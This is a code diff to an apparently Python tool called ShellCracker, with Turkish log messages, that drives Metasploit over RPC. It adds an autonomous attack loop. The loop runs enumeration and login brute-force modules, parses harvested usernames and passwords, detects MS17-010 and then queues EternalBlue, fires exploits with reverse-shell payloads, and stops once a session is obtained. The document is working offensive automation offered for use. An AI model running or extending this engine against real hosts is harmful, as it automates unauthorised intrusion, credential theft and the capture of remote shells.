@@ -16,14 +16,18 @@ The executor only ever touches the single target address handed to it.
 from __future__ import annotations
 
 import logging
+import os
+import re
 import shutil
 import subprocess
+import tempfile
 import time
 from dataclasses import dataclass, field
 from datetime import datetime
 from typing import Any
 
 from .matcher import ExploitCandidate
+from .strategy import AttackPlan, AttackVector, Finding, PHASES, StrategyEngine
 
 logger = logging.getLogger("ShellCracker.executor")
 
@@ -49,9 +53,18 @@ class AttemptRecord:
     reason: str = ""
     started_at: str = ""
     finished_at: str = ""
+    # Autonomous-engine metadata (empty for the legacy path).
+    phase: str = "exploit"
+    kind: str = "exploit"
+    score: float = 0.0
+    rationale: str = ""
+    findings: list[str] = field(default_factory=list)
+    output: str = ""
 
     def to_dict(self) -> dict[str, Any]:
-        return self.__dict__.copy()
+        # Drop internal attributes (e.g. the raw Finding objects cached for the
+        # adaptive loop) so the record stays JSON-serialisable.
+        return {k: v for k, v in self.__dict__.items() if not k.startswith("_")}
 
 
 def connect(
@@ -267,30 +280,55 @@ class Executor:
             return set()
 
     def try_candidate(self, candidate: ExploitCandidate) -> AttemptRecord:
-        """Validate (optional) and fire a single candidate once.
-
-        Returns an :class:`AttemptRecord` describing exactly what happened,
-        whether or not a session was obtained.
-        """
-        record = AttemptRecord(
+        """Legacy path: validate+fire a single :class:`ExploitCandidate` once."""
+        return self._fire_exploit(
             module=candidate.module,
-            started_at=datetime.now().isoformat(timespec="seconds"),
+            port=candidate.service_port,
+            rank=candidate.rank,
         )
-        logger.info("=== Aday: exploit/%s (rank=%s) ===", candidate.module, candidate.rank)
+
+    def _fire_exploit(
+        self,
+        module: str,
+        port: int,
+        extra_options: dict[str, Any] | None = None,
+        rank: str = "",
+        record: AttemptRecord | None = None,
+    ) -> AttemptRecord:
+        """Validate (optional) and fire a single exploit module once.
+
+        ``extra_options`` are set on the exploit before firing (e.g. SMBUser /
+        SMBPass for psexec). Returns an :class:`AttemptRecord` describing
+        exactly what happened, whether or not a session was obtained.
+        """
+        if record is None:
+            record = AttemptRecord(module=module)
+        record.started_at = datetime.now().isoformat(timespec="seconds")
+        record.kind = "exploit"
+        record.phase = "exploit"
+        logger.info("=== Exploit: exploit/%s%s ===", module,
+                    f" (rank={rank})" if rank else "")
 
         try:
-            exploit = self.client.modules.use("exploit", candidate.module)
+            exploit = self.client.modules.use("exploit", module)
         except Exception as exc:  # noqa: BLE001 - module missing/renamed
             record.reason = f"modul yuklenemedi: {exc}"
             record.finished_at = datetime.now().isoformat(timespec="seconds")
             logger.warning("  atlaniyor: %s", record.reason)
             return record
 
-        # Target + port.
+        # Target + port + any extra module options (creds, etc.).
         try:
             exploit["RHOSTS"] = self.target
-            if candidate.service_port:
-                exploit["RPORT"] = candidate.service_port
+            if port:
+                exploit["RPORT"] = port
+            for k, v in (extra_options or {}).items():
+                if k.startswith("_") or k in ("RHOSTS", "RPORT"):
+                    continue
+                try:
+                    exploit[k] = v
+                except Exception:  # noqa: BLE001 - module may not accept it
+                    logger.debug("  %s secenegi atlandi", k)
         except Exception as exc:  # noqa: BLE001
             record.reason = f"hedef secenekleri ayarlanamadi: {exc}"
             record.finished_at = datetime.now().isoformat(timespec="seconds")
@@ -303,19 +341,16 @@ class Executor:
         record.payload = payload
         record.lport = lport
         record.parameters = {
-            "RHOSTS": self.target,
-            "RPORT": candidate.service_port,
-            "PAYLOAD": payload,
-            "LHOST": lhost,
-            "LPORT": lport,
+            "RHOSTS": self.target, "RPORT": port, "PAYLOAD": payload,
+            "LHOST": lhost, "LPORT": lport,
+            **{k: v for k, v in (extra_options or {}).items()
+               if not k.startswith("_") and k not in ("RHOSTS", "RPORT")},
         }
 
         # Dry-run check if enabled and supported.
         if self.exec_cfg.get("check_before_fire", True):
             record.check_result = _run_check(exploit)
             logger.info("  check(): %s", record.check_result)
-            # "safe"/"appears" vary per module; we only hard-skip on an explicit
-            # "not vulnerable"/"safe" code to avoid wasting an attempt.
             low = record.check_result.lower()
             if "not vulnerable" in low or low == "safe":
                 record.reason = f"check hedefi savunmasiz bulmadi ({record.check_result})"
@@ -323,7 +358,6 @@ class Executor:
                 logger.info("  atlaniyor: %s", record.reason)
                 return record
 
-        # Build the payload object with reverse-handler settings.
         try:
             payload_obj = self.client.modules.use("payload", payload)
             payload_obj["LHOST"] = lhost
@@ -344,7 +378,6 @@ class Executor:
             logger.warning("  %s", record.reason)
             return record
 
-        # Poll for a new session (reverse connections take a moment).
         sid = self._wait_for_session(before, timeout=25)
         if sid is None:
             record.reason = "sure icinde oturum acilmadi"
@@ -394,6 +427,243 @@ class Executor:
             if i < min(max_attempts, len(candidates)):
                 logger.info("Sonraki denemeden once %d sn bekleniyor...", delay)
                 time.sleep(delay)
+
+        return records
+
+    # ================================================================== #
+    #  Autonomous engine: auxiliary/login execution + adaptive plan loop  #
+    # ================================================================== #
+
+    def _console_run(self, commands: list[str], max_wait: int = 90) -> str:
+        """Run console commands in a throwaway msf console and return output.
+
+        Used for auxiliary/login modules, whose human-readable output (login
+        successes, share lists, vuln verdicts) is easiest to capture and parse
+        from the console rather than the RPC job API.
+        """
+        try:
+            console = self.client.consoles.console()
+        except Exception as exc:  # noqa: BLE001
+            return f"[console acilamadi: {exc}]"
+
+        out = ""
+        try:
+            for cmd in commands:
+                console.write(cmd)
+            deadline = time.time() + max_wait
+            idle = 0
+            while time.time() < deadline:
+                time.sleep(1)
+                try:
+                    chunk = console.read()
+                except Exception:  # noqa: BLE001
+                    break
+                data = chunk.get("data", "") if isinstance(chunk, dict) else ""
+                busy = chunk.get("busy", False) if isinstance(chunk, dict) else False
+                if data:
+                    out += data
+                    idle = 0
+                else:
+                    idle += 1
+                # Stop once the module is done and output has settled.
+                if not busy and idle >= 2:
+                    break
+        finally:
+            try:
+                self.client.consoles.destroy(console.cid)
+            except Exception:  # noqa: BLE001 - best-effort teardown
+                pass
+        return out
+
+    def _materialize_credfiles(self, options: dict[str, Any]) -> tuple[dict[str, Any], list[str]]:
+        """Turn internal ``_users``/``_passwords`` lists into msf USER/PASS files.
+
+        Returns (clean_options, tempfile_paths_to_remove).
+        """
+        opts = {k: v for k, v in options.items() if not k.startswith("_")}
+        tmpfiles: list[str] = []
+        users = options.get("_users")
+        passwords = options.get("_passwords")
+        if users:
+            fd, path = tempfile.mkstemp(prefix="sc_users_", suffix=".txt")
+            with os.fdopen(fd, "w", encoding="utf-8") as fh:
+                fh.write("\n".join(users))
+            opts["USER_FILE"] = path
+            tmpfiles.append(path)
+        if passwords:
+            fd, path = tempfile.mkstemp(prefix="sc_pass_", suffix=".txt")
+            with os.fdopen(fd, "w", encoding="utf-8") as fh:
+                # msf treats an empty line as a blank password.
+                fh.write("\n".join(passwords))
+            opts["PASS_FILE"] = path
+            tmpfiles.append(path)
+        return opts, tmpfiles
+
+    _CRED_RE = re.compile(r"Success:\s*'([^':]*):([^']*)'")
+    _LOGIN_RE = re.compile(r"(?i)(login successful|successful login|valid credentials)")
+
+    def _parse_findings(self, vector: AttackVector, output: str) -> list[Finding]:
+        """Extract actionable findings from auxiliary/login module output."""
+        findings: list[Finding] = []
+        low = output.lower()
+
+        # Credentials (msf prints "Success: 'user:pass'").
+        for m in self._CRED_RE.finditer(output):
+            findings.append(Finding(
+                key="creds", value=(m.group(1), m.group(2)),
+                port=vector.service_port, category=vector.category,
+                detail="login scanner",
+            ))
+        if not findings and vector.kind == "login" and self._LOGIN_RE.search(output):
+            findings.append(Finding(
+                key="creds", value=("<goruldu>", ""),
+                port=vector.service_port, category=vector.category,
+                detail="login basarili (ayristirilamadi)",
+            ))
+
+        # MS17-010 verdict.
+        if "ms17_010" in vector.module and (
+            "is likely vulnerable" in low or "vulnerable to ms17-010" in low
+            or "the target is vulnerable" in low
+        ):
+            findings.append(Finding(key="smb.ms17_010", value=True,
+                                    port=vector.service_port, category="smb"))
+
+        # Anonymous FTP.
+        if "anonymous" in vector.module and (
+            "anonymous read" in low or "230 login successful" in low
+            or "anonymous access allowed" in low
+        ):
+            findings.append(Finding(key="ftp.anonymous", value=True,
+                                    port=vector.service_port, category="ftp"))
+
+        # SMB null session / readable shares.
+        if "enumshares" in vector.module and ("readable" in low or "share" in low):
+            findings.append(Finding(key="smb.null_session", value=True,
+                                    port=vector.service_port, category="smb"))
+        return findings
+
+    def _run_aux_vector(self, vector: AttackVector) -> AttemptRecord:
+        """Run an auxiliary/login module via the console and parse findings."""
+        record = AttemptRecord(
+            module=vector.module, kind=vector.kind, phase=vector.phase,
+            score=vector.score, rationale=vector.rationale,
+            started_at=datetime.now().isoformat(timespec="seconds"),
+        )
+        logger.info("=== %s: auxiliary/%s (skor=%.0f) ===",
+                    vector.kind.upper(), vector.module, vector.score)
+
+        options, tmpfiles = self._materialize_credfiles(vector.options)
+        record.parameters = {k: v for k, v in options.items()}
+
+        before = self._current_session_ids()
+        commands = [f"use auxiliary/{vector.module}\n"]
+        for key, val in options.items():
+            commands.append(f"set {key} {val}\n")
+        commands.append("run\n")
+
+        try:
+            output = self._console_run(commands)
+            record.fired = True
+        except Exception as exc:  # noqa: BLE001
+            record.reason = f"auxiliary calistirilamadi: {exc}"
+            record.finished_at = datetime.now().isoformat(timespec="seconds")
+            return record
+        finally:
+            for path in tmpfiles:
+                try:
+                    os.remove(path)
+                except OSError:
+                    pass
+
+        record.output = output[-4000:]  # keep the tail for the report
+        found = self._parse_findings(vector, output)
+        record.findings = [f"{f.key}={f.value}" for f in found]
+        record._findings_obj = found  # type: ignore[attr-defined]
+
+        # A login scanner with CreateSession may have dropped a live session.
+        new_sids = self._current_session_ids() - before
+        if new_sids:
+            sid = sorted(new_sids)[0]
+            self._owned_sessions.add(sid)
+            ok, stype, proof = _verify_session(self.client, sid)
+            record.session_id = sid
+            record.session_type = stype
+            record.proof = proof
+            record.success = ok
+            record.reason = "kimlik dogrulama ile oturum alindi"
+            logger.info("  OTURUM %s (%s) — kimlikle", sid, stype or "?")
+        elif found:
+            record.reason = f"{len(found)} bulgu: " + ", ".join(record.findings)
+            logger.info("  bulgu: %s", record.reason)
+        else:
+            record.reason = "bulgu yok"
+        record.finished_at = datetime.now().isoformat(timespec="seconds")
+        return record
+
+    def execute_vector(self, vector: AttackVector) -> AttemptRecord:
+        """Dispatch a vector to the right executor by kind."""
+        vector.done = True
+        if vector.kind == "exploit":
+            rec = self._fire_exploit(
+                module=vector.module, port=vector.service_port,
+                extra_options=vector.options,
+            )
+            rec.phase, rec.kind = vector.phase, vector.kind
+            rec.score, rec.rationale = vector.score, vector.rationale
+            return rec
+        return self._run_aux_vector(vector)
+
+    def run_plan(self, plan: AttackPlan, engine: StrategyEngine) -> list[AttemptRecord]:
+        """Execute the plan phase by phase, feeding findings back to the engine.
+
+        Order: enumerate -> exploit -> credentials -> misconfig (configurable).
+        Enumeration/credential findings are passed to ``engine.incorporate``,
+        which may boost queued vectors or inject new ones (e.g. EternalBlue once
+        MS17-010 is confirmed), realising the adaptive decision loop.
+        """
+        scfg = self.config.get("strategy", {}) or {}
+        phases = scfg.get("phases", list(PHASES))
+        stop_on_shell = bool(scfg.get("stop_on_first_shell", True))
+        budgets = {
+            "exploit": int(scfg.get("max_exploit_attempts", 8)),
+            "enumerate": int(scfg.get("max_enum_modules", 14)),
+            "credentials": int(scfg.get("max_credential_attempts", 6)),
+            "misconfig": int(scfg.get("max_misconfig_attempts", 6)),
+        }
+        records: list[AttemptRecord] = []
+        delay = int(self.exec_cfg.get("delay_between_attempts", 5))
+
+        for phase in phases:
+            spent = 0
+            # pending() is re-queried each iteration so adaptively-injected
+            # vectors (added mid-phase) are picked up and re-sorted by score.
+            while spent < budgets.get(phase, 6):
+                queue = plan.pending(phase)
+                if not queue:
+                    break
+                vector = queue[0]
+                spent += 1
+                logger.info("[%s %d/%d] %s/%s",
+                            phase, spent, budgets.get(phase, 6),
+                            vector.module_type, vector.module)
+                record = self.execute_vector(vector)
+                records.append(record)
+
+                # Adaptive feedback from enumeration/credential findings.
+                found = getattr(record, "_findings_obj", None)
+                if found:
+                    new_vectors = engine.incorporate(found)
+                    for nv in new_vectors:
+                        logger.info("  +adaptif: %s (skor=%.0f) — %s",
+                                    nv.module, nv.score, nv.rationale)
+
+                if record.success:
+                    logger.info("Oturum alindi (%s fazi).", phase)
+                    if stop_on_shell:
+                        return records
+                if spent < budgets.get(phase, 6) and plan.pending(phase):
+                    time.sleep(delay)
 
         return records
 
